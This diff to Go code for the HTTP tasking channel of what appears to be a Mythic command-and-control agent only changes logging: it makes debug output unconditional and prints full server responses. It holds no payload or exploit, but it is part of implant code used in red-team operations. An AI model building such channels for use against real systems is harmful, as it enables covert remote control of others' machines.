@@ -147,45 +147,47 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent) ([]structs.Task, error) {
 
 	resp, err := h.makeRequest("POST", h.Endpoint, []byte(encodedData))
 	if err != nil {
+		log.Printf("[DEBUG] GetTasking makeRequest failed: %v", err)
 		return nil, fmt.Errorf("get tasking request failed: %w", err)
 	}
 	defer resp.Body.Close()
 
-	if h.Debug {
-		log.Printf("[DEBUG] GetTasking response status: %d", resp.StatusCode)
-	}
+	log.Printf("[DEBUG] GetTasking response status: %d", resp.StatusCode)
 
 	if resp.StatusCode != http.StatusOK {
+		log.Printf("[DEBUG] GetTasking failed with non-200 status: %d", resp.StatusCode)
 		return nil, fmt.Errorf("get tasking failed with status: %d", resp.StatusCode)
 	}
 
 	respBody, err := io.ReadAll(resp.Body)
 	if err != nil {
+		log.Printf("[DEBUG] Failed to read GetTasking response body: %v", err)
 		return nil, fmt.Errorf("failed to read response body: %w", err)
 	}
 
-	if h.Debug {
-		log.Printf("[DEBUG] GetTasking response body length: %d", len(respBody))
-	}
+	log.Printf("[DEBUG] GetTasking response body length: %d", len(respBody))
+	log.Printf("[DEBUG] GetTasking response body: %s", string(respBody))
 
 	// Decrypt if encryption key is provided
 	if h.EncryptionKey != "" {
 		// TODO: Implement decryption
+		log.Printf("[DEBUG] Skipping decryption (not implemented)")
 	}
 
-	if h.Debug {
-		log.Printf("[DEBUG] Tasking response: %s", string(respBody))
-	}
+	log.Printf("[DEBUG] Attempting to parse GetTasking response as JSON")
 
 	// Parse the response - Mythic returns different formats
 	// For now, assume it returns a JSON array of tasks
 	var taskResponse map[string]interface{}
 	if err := json.Unmarshal(respBody, &taskResponse); err != nil {
 		// If not JSON, might be no tasks
-		if h.Debug {
-			log.Printf("[DEBUG] No JSON response, assuming no tasks")
-		}
+		log.Printf("[DEBUG] Response is not JSON, assuming no tasks: %v", err)
 		return []structs.Task{}, nil
+	}
+
+	log.Printf("[DEBUG] Parsed JSON response with %d top-level keys", len(taskResponse))
+	for key, _ := range taskResponse {
+		log.Printf("[DEBUG] Response contains key: %s", key)
 	}
 
 	// Extract tasks from response
@@ -275,7 +277,15 @@ func (h *HTTPProfile) makeRequest(method, path string, body []byte) (*http.Respo
 		log.Printf("[DEBUG] Request body: %s", string(body))
 	}
 
-	return h.client.Do(req)
+	log.Printf("[DEBUG] Executing HTTP client.Do()")
+	resp, err := h.client.Do(req)
+	if err != nil {
+		log.Printf("[DEBUG] HTTP client.Do() failed: %v", err)
+		return nil, fmt.Errorf("HTTP request failed: %w", err)
+	}
+	
+	log.Printf("[DEBUG] HTTP client.Do() completed successfully, status: %d", resp.StatusCode)
+	return resp, nil
 }
 
 // getString safely gets a string value from a map
